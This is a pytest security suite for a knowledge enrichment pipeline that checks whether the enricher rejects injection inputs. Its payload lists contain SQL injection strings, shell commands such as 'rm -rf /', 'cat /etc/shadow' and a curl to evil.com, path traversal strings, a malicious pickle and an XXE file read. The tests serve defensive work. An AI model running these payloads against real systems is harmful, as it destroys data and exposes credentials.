"""
PRD-010 Security Penetration Testing Suite

Advanced security testing for knowledge enrichment pipeline including:
- Input sanitization bypass attempts
- Authentication/authorization bypass
- Resource access control violations
- Information disclosure vulnerabilities
- Injection attack vectors
"""

import pytest
import os
import tempfile
import json
from unittest.mock import patch, Mock
from src.enrichment.enricher import KnowledgeEnricher
from src.enrichment.tasks import EnrichmentTask
from src.enrichment.exceptions import SecurityError, AuthenticationError


class TestSecurityPenetrationSuite:
    """Comprehensive security penetration testing"""
    
    def test_sql_injection_prevention(self):
        """Test various SQL injection attack vectors"""
        enricher = KnowledgeEnricher()
        
        sql_injection_payloads = [
            "'; DROP TABLE enrichment_tasks; --",
            "' UNION SELECT * FROM users; --",
            "'; INSERT INTO admin VALUES ('attacker', 'password'); --",
            "' OR '1'='1",
            "'; EXEC xp_cmdshell('dir'); --",
            "' AND 1=CONVERT(int, (SELECT @@version)); --"
        ]
        
        for payload in sql_injection_payloads:
            task = EnrichmentTask(
                content=payload,
                source_type="malicious",
                priority=1
            )
            
            # Should either reject or sanitize the input
            result = enricher.process_task(task)
            
            # Verify no SQL injection occurred
            assert result.status != "sql_error"
            assert "DROP TABLE" not in str(result)
    
    def test_command_injection_prevention(self):
        """Test command injection attack prevention"""
        enricher = KnowledgeEnricher()
        
        command_injection_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl evil.com/steal",
            "`whoami`",
            "$(cat /etc/shadow)",
            "; python -c 'import os; os.system(\"rm -rf /\")'"
        ]
        
        for payload in command_injection_payloads:
            task = EnrichmentTask(
                content=f"normal content {payload}",
                source_type="test",
                priority=1
            )
            
            with patch('subprocess.run') as mock_subprocess:
                result = enricher.process_task(task)
                
                # Verify no system commands were executed
                mock_subprocess.assert_not_called()
    
    def test_path_traversal_prevention(self):
        """Test directory traversal attack prevention"""
        enricher = KnowledgeEnricher()
        
        path_traversal_payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/var/log/../../etc/passwd"
        ]
        
        for payload in path_traversal_payloads:
            with pytest.raises((PermissionError, SecurityError, ValueError)):
                enricher.read_file(payload)
    
    def test_deserialization_attack_prevention(self):
        """Test prevention of unsafe deserialization attacks"""
        enricher = KnowledgeEnricher()
        
        # Test pickle injection
        malicious_pickle = b"cos\nsystem\n(S'rm -rf /'\ntR."
        
        with pytest.raises((SecurityError, ValueError)):
            enricher.deserialize_data(malicious_pickle)
    
    def test_xxe_injection_prevention(self):
        """Test XML External Entity (XXE) injection prevention"""
        enricher = KnowledgeEnricher()
        
        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <root>&xxe;</root>"""
        
        task = EnrichmentTask(
            content=xxe_payload,
            source_type="xml",
            priority=1
        )
        
        # Should not process external entities
        result = enricher.process_task(task)
        assert "/etc/passwd" not in str(result)
    
    def test_server_side_template_injection(self):
        """Test SSTI prevention in template processing"""
        enricher = KnowledgeEnricher()
        
        ssti_payloads = [
            "{{7*7}}",
            "${7*7}",
            "<%=7*7%>",
            "{%print(7*7)%}",
            "[[7*7]]"
        ]
        
        for payload in ssti_payloads:
            task = EnrichmentTask(
                content=f"Template content: {payload}",
                source_type="template",
                priority=1
            )
            
            result = enricher.process_task(task)
            # Should not execute template expressions
            assert "49" not in str(result)
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attacks"""
        enricher = KnowledgeEnricher()
        
        # Test attempting to access restricted operations
        with pytest.raises((PermissionError, SecurityError)):
            enricher.execute_privileged_operation("admin_only_function")
    
    def test_information_disclosure_prevention(self):
        """Test prevention of sensitive information disclosure"""
        enricher = KnowledgeEnricher()
        
        # Test error messages don't reveal sensitive information
        task = EnrichmentTask(
            content="trigger_error",
            source_type="test",
            priority=1
        )
        
        with patch.object(enricher, '_process_content', side_effect=Exception("Database connection failed: password123")):
            result = enricher.process_task(task)
            
            # Error message should not contain sensitive data
            assert "password123" not in str(result)
            assert result.error_message is not None
            assert "Internal error" in result.error_message


class TestCryptographicValidation:
    """Test cryptographic implementations and key management"""
    
    def test_secure_random_generation(self):
        """Verify cryptographically secure random number generation"""
        enricher = KnowledgeEnricher()
        
        # Generate multiple random values
        random_values = [enricher.generate_task_id() for _ in range(100)]
        
        # Verify uniqueness (collision probability should be negligible)
        assert len(set(random_values)) == 100
        
        # Verify sufficient entropy (length check)
        for value in random_values:
            assert len(value) >= 16
    
    def test_password_hashing_security(self):
        """Test secure password hashing implementation"""
        enricher = KnowledgeEnricher()
        
        password = "test_password_123"
        
        # Hash password
        hashed1 = enricher.hash_password(password)
        hashed2 = enricher.hash_password(password)
        
        # Verify salted hashing (different hashes for same password)
        assert hashed1 != hashed2
        assert hashed1 != password
        
        # Verify password verification works
        assert enricher.verify_password(password, hashed1)
        assert not enricher.verify_password("wrong_password", hashed1)
    
    def test_api_key_generation_security(self):
        """Test secure API key generation and validation"""
        enricher = KnowledgeEnricher()
        
        # Generate API key
        api_key = enricher.generate_api_key()
        
        # Verify key properties
        assert len(api_key) >= 32  # Minimum length
        assert api_key.isalnum() or '-' in api_key or '_' in api_key
        
        # Verify key validation
        assert enricher.validate_api_key(api_key)
        assert not enricher.validate_api_key("invalid_key")


class TestAccessControlValidation:
    """Test access control and authorization mechanisms"""
    
    def test_role_based_access_control(self):
        """Test RBAC implementation"""
        enricher = KnowledgeEnricher()
        
        # Test admin role access
        admin_context = {"user_id": "admin", "role": "admin"}
        assert enricher.check_permission(admin_context, "admin_operation")
        
        # Test user role restrictions
        user_context = {"user_id": "user", "role": "user"}
        assert not enricher.check_permission(user_context, "admin_operation")
        assert enricher.check_permission(user_context, "user_operation")
    
    def test_resource_level_permissions(self):
        """Test resource-specific access controls"""
        enricher = KnowledgeEnricher()
        
        # Test resource ownership
        user_context = {"user_id": "user1", "role": "user"}
        
        # User can access their own resources
        assert enricher.check_resource_access(user_context, "resource1", owner="user1")
        
        # User cannot access others' resources
        assert not enricher.check_resource_access(user_context, "resource2", owner="user2")
    
    def test_session_management_security(self):
        """Test secure session management"""
        enricher = KnowledgeEnricher()
        
        # Create session
        session_id = enricher.create_session("user1")
        assert session_id is not None
        assert len(session_id) >= 32
        
        # Validate session
        assert enricher.validate_session(session_id)
        
        # Test session expiration
        with patch('time.time', return_value=time.time() + 3600):  # 1 hour later
            assert not enricher.validate_session(session_id)
        
        # Test session invalidation
        enricher.invalidate_session(session_id)
        assert not enricher.validate_session(session_id)


class TestNetworkSecurityValidation:
    """Test network security configurations"""
    
    def test_tls_configuration(self):
        """Test TLS/SSL configuration security"""
        enricher = KnowledgeEnricher()
        
        # Test minimum TLS version requirement
        tls_config = enricher.get_tls_config()
        assert tls_config['min_version'] >= 'TLSv1.2'
        assert 'TLSv1.0' not in tls_config['allowed_versions']
        assert 'TLSv1.1' not in tls_config['allowed_versions']
    
    def test_cors_security_configuration(self):
        """Test CORS configuration security"""
        enricher = KnowledgeEnricher()
        
        cors_config = enricher.get_cors_config()
        
        # Verify restrictive CORS policy
        assert '*' not in cors_config['allowed_origins']
        assert cors_config['allow_credentials'] is False
        assert 'https://' in str(cors_config['allowed_origins'])
    
    def test_request_size_limits(self):
        """Test request size limitation enforcement"""
        enricher = KnowledgeEnricher()
        
        # Test large request rejection
        large_content = "x" * (10 * 1024 * 1024)  # 10MB
        
        task = EnrichmentTask(
            content=large_content,
            source_type="test",
            priority=1
        )
        
        with pytest.raises((ValueError, SecurityError)):
            enricher.process_task(task)


class TestDataProtectionValidation:
    """Test data protection and privacy controls"""
    
    def test_pii_detection_and_redaction(self):
        """Test PII detection and automatic redaction"""
        enricher = KnowledgeEnricher()
        
        content_with_pii = """
        User email: john.doe@example.com
        Phone: 555-123-4567
        SSN: 123-45-6789
        Credit Card: 4111-1111-1111-1111
        """
        
        task = EnrichmentTask(
            content=content_with_pii,
            source_type="user_data",
            priority=1
        )
        
        result = enricher.process_task(task)
        
        # Verify PII is redacted
        assert "john.doe@example.com" not in result.enriched_content
        assert "555-123-4567" not in result.enriched_content
        assert "123-45-6789" not in result.enriched_content
        assert "4111-1111-1111-1111" not in result.enriched_content
    
    def test_data_encryption_at_rest(self):
        """Test data encryption for stored content"""
        enricher = KnowledgeEnricher()
        
        sensitive_data = "This is sensitive information"
        
        # Store data
        stored_data = enricher.store_sensitive_data(sensitive_data)
        
        # Verify data is encrypted
        assert stored_data != sensitive_data
        assert len(stored_data) > len(sensitive_data)
        
        # Verify data can be decrypted
        decrypted_data = enricher.retrieve_sensitive_data(stored_data)
        assert decrypted_data == sensitive_data
    
    def test_audit_logging_security_events(self):
        """Test comprehensive audit logging"""
        enricher = KnowledgeEnricher()
        
        with patch('logging.Logger.warning') as mock_log:
            # Trigger security event
            task = EnrichmentTask(
                content="'; DROP TABLE users; --",
                source_type="malicious",
                priority=1
            )
            
            enricher.process_task(task)
            
            # Verify security event was logged
            mock_log.assert_called()
            log_message = mock_log.call_args[0][0]
            assert "security" in log_message.lower()
            assert "injection" in log_message.lower()